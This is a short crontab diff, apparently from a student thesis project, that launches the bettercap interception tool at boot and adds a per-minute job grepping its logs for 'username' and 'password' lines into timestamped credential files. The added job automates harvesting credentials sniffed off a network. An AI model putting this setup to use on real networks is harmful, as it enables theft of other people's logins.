@@ -3,3 +3,6 @@
 
 #start bettercap
 @reboot at now + 2 min -f /home/ubuntu/inzynierka/bettercap/start_bettercap.sh
+
+#filter logs for credentials
+*/1 * * * * rm /home/ubuntu/dane_inzynierka/credentials-bettercap/* ; grep -n -E "username|password" /home/ubuntu/dane_inzynierka/bettercap-logs/* > /home/ubuntu/dane_inzynierka/credentials-bettercap/credentials_$(date +%d-%m-%Y_%I:%M%p).txt
